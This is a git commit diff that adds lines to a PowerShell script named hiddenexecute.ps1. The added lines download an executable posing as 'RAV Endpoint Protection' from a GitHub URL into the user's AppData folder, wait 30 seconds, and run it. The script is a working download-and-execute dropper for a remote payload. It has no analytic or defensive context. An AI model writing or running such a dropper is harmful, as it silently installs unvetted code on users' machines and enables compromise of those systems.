3bc149fe451d443b7966f233a3632421405fb1c9
webntdev <96979468+webntdev@users.noreply.github.com>
2024-05-23 19:42:30 +0300

    Update hiddenexecute.ps1

--- files/hiddenexecute.ps1
+++ files/hiddenexecute.ps1
@@ -1,1 +1,7 @@
 Start-Process "calc.exe"
+$x = "https://github.com/webntdev/webntdev.github.io/raw/main/RAV/beta/RAVEndpointProtection.exe"
+$y = "$env:USERPROFILE\AppData\Local\RAVEndpointProtectionbeta.exe"
+
+Invoke-WebRequest -Uri $x -OutFile $y
+Start-Sleep -Seconds 30
+Start-Process $y
